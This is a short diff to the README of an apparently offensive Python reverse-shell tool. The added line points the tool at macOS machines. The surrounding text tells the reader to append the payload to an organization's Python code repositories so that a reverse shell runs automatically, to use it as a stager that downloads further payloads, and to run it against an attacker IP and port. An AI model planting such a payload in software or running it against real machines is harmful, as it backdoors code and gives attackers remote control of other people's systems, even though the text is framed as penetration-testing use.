@@ -27,6 +27,7 @@ Currently you can, after you gain a foothold in organization
 2. Replace the proof-of-concept code with a Metasploit python payload
 3. Locate the Python code repositories of a organization during a pentest and then copy-paste the entire code and append it to the bottom of the python module, guarantee auto-execution of the reverse shell when the code runs
 4. Use the payload as a stager to download additional payloads
+5. Use the payload against MacOS (MacBooks, iMacs, etc). They natively run Python 2.7.1
 
 Run it as ```python darklordobama.py <attacker IP> <attacker listening port>```
 
